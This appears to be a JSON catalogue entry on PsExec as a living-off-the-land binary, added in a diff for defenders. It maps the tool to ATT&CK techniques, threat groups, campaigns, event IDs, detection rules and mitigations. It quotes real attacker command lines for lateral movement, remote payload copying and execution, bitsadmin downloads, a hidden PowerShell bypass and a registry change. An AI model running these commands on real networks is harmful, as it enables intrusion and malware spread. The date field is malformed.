@@ -1,0 +1,158 @@
+{
+  "type": "lolbin",
+  "version": 1,
+  "id": "44dd26a6-4c83-4fbe-9df3-ebf27693d193",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2023-10-14T00:00",
+  "modified": "2023-10-1417T00:00",
+  "name": "PsExec[.]exe",
+  "description": "PsExec is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.",
+  "Required_privilege": [
+    "User"
+  ],
+  "paths": [
+    "C:\\SysinternalsSuite\\PsExec[.]exe",
+    "C:\\.\\PsExec[.]exe"
+  ],
+  "hashe": "27304B246C7D5B4E149124D5F93C5B01",
+  "associated_kill_chain_phases": [
+    "TA0002:Execution:T1569.002",
+    "TA0003:Persistence:T1136.002",
+    "TA0004:Privilege Escalation:T1543.003",
+    "TA0008:Lateral Movement:T1570",
+    "TA0008:Lateral Movement:T1021.002"
+  ],
+  "capabilities": [
+    "Alternate data streams",
+    "Execute",
+    "Download",
+    "Upload"
+  ],
+  "relationship": [
+    {
+      "associated_apts": [
+        "Naikon",
+        "APT39",
+        "Fox Kitten",
+        "Wizard Spider",
+        "Kimsuky",
+        "Turla",
+        "Cobalt Group",
+        "Sandworm Team",
+        "menuPass",
+        "Chimera",
+        "Dragonfly",
+        "Threat Group-1314",
+        "Moses Staff",
+        "Indrik Spider",
+        "GALLIUM",
+        "TEMP.Veles",
+        "FIN5",
+        "Carbanak",
+        "DarkVishnya",
+        "BlackTech",
+        "Leafminer",
+        "Thrip",
+        "OilRig",
+        "APT29",
+        "Cleaver",
+        "APT1",
+        "HAFNIUM",
+        "Magic Hound",
+        "FIN6"
+      ],
+      "Relationship Campaigns->Tool": [
+        "During [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors used [PsExec](https://attack.mitre.org/software/S0029).(Citation: BlackBerry CostaRicto November 2020)",
+        "During [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors used [PsExec](https://attack.mitre.org/software/S0029) to interact with other systems inside the internal network.(Citation: FoxIT Wocao December 2019)",
+        "During [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors used [PsExec](https://attack.mitre.org/software/S0029) to remotely execute droppers.(Citation: McAfee Night Dragon)",
+        "For [Operation Ghost](https://attack.mitre.org/campaigns/C0023), [APT29](https://attack.mitre.org/groups/G0016) used [PsExec](https://attack.mitre.org/software/S0029) for lateral movement on compromised networks.(Citation: ESET Dukes October 2019)"
+      ],
+      "associated_campaigns": [
+        "CostaRicto",
+        "Operation Wocao",
+        "Night Dragon",
+        "Operation Ghost"
+      ],
+      "Relationship APTs->Tool": [],
+      "associated_commands": [
+        "start PsExec[.]exe /accepteula @C:\\share$\\comps1.txt -u [REDACTED] -p [REDACTED] cmd /c COPY \\\"\\\\[REDACTED]\\share$\\vVv[.]exe\" \"C:\\windows\\temp\\vVv[.]exe\"",
+        "start PsExec[.]exe -d @C:\\share$\\comps1.txt -u [REDACTED] -p [REDACTED] cmd /c c:\\windows\\temp\\vVv[.]exe",
+        "C:\\psexec[.]exe @ip-list.txt -d cmd /c “(net use q: /delete /y &; net use q: \\\\DomainController\\DomainName /user:DomainName\\administrator ThisWasThePassword &; powershell -ExecutionPolicy ByPass -NoLogo -NoProfile -windowstyle hidden -NoExit -File q:\\P100119.ps1",
+        "psexec[.]exe  \\\\<IP ADDRESS> -u <DOMAIN>\\Administrator -p \\\"<PASSWORD>\\\" -s -d -h -r mstdc -accepteula -nobanner c:\\windows\\temp\\ttsel[.]exe",
+        "psexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add \\\"hklm\\system\\currentcontrolset\\control\\lsa\\\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0"
+      ],
+      "pre_and_next_related_cmd": [
+        {
+          "pre_cmd_event": [
+            "start wmic /node:@C:\\share$\\comps1.txt /user:[REDACTED] /password:[REDACTED] process call create \\\"cmd[.]exe /c bitsadmin /transfer vVv \\\\[REDACTED]\\share$\\vVv[.]exe %APPDATA%\\vVv[.]exe & %APPDATA%\\vVv[.]exe",
+            "C:\\Windows\\system32\\cmd[.]exe /K copy ttsel[.]exe \\\\<IP>\\c$\\windows\\temp\\"
+          ],
+          "next_cmd_event": []
+        }
+      ]
+    }
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "detections": [
+    {
+      "eventsid": [
+        {
+          "sysmon": [
+            "T1136.002:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1",
+            "T1570:file:file_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:11",
+            "T1021.002:network_traffic:Process_connected_to_Ip:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3"
+          ],
+          "windows": [
+            "T1136.002:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
+            "T1136.002:script:script_execution:log_channel:Microsoft-Windows-PowerShell/Operational:log_provider:Microsoft-Windows-PowerShell:4103",
+            "T1136.002:user:A_computer_account_was_created:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4741",
+            "T1136.002:user:A_computer_account_was_created:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:7020",
+            "T1570:user:An_attempt_was_made_to_access_an_object:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4663",
+            "T1021.002:user:User_created_logon_from_Ip:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4778",
+            "T1543.003:user:User_created_Service:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4697"
+          ]
+        }
+      ],
+      "sigma_rules": [
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/file/file_event/file_event_win_sysinternals_psexec_service_key.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_sysinternals_psexec_remote_execution.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/file/file_event/file_event_win_sysinternals_psexec_service_key.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/builtin/security/win_security_metasploit_or_impacket_smb_psexec_service_install.yml"
+      ],
+      "other_rules": [
+        "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/detect_psexec_with_accepteula_flag.yml",
+        "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/detect_renamed_psexec.yml",
+        "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/execution_psexec_lateral_movement_command.toml"
+      ]
+    }
+  ],
+  "related_CVE": [
+    "CVE-2022-47966",
+    "CVE-2022-42475",
+    "CVE-2021-1733"
+  ],
+  "mitigations": [
+    "Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level.",
+    "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.",
+    "On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by [PsExec](https://attack.mitre.org/software/S0029) from running. (Citation: win10_asr)",
+    "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. ",
+    "Ensure that Driver Signature Enforcement is enabled to restrict unsigned drivers from being installed. ",
+    "Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them. ",
+    "Enforce registration and execution of only legitimately signed service drivers where possible.",
+    "Consider using the host firewall to restrict file sharing communications such as SMB. (Citation: Microsoft Preventing SMB)",
+    "Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed.",
+    "Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.",
+    "Consider disabling Windows administrative shares.",
+    "Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.",
+    "Protect domain controllers by ensuring proper security configuration for critical servers.",
+    "Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.",
+    "Use multi-factor authentication for user and privileged accounts."
+  ],
+  "references": [
+    "https://attack.mitre.org/software/S0029/",
+    "https://app.tidalcyber.com/software/73eb32af-4bd3-4e21-8048-355edc55a9c6-PsExec",
+    "https://strontic.github.io/xcyclopedia/library/PsExec.exe-27304B246C7D5B4E149124D5F93C5B01.html"
+  ]
+}
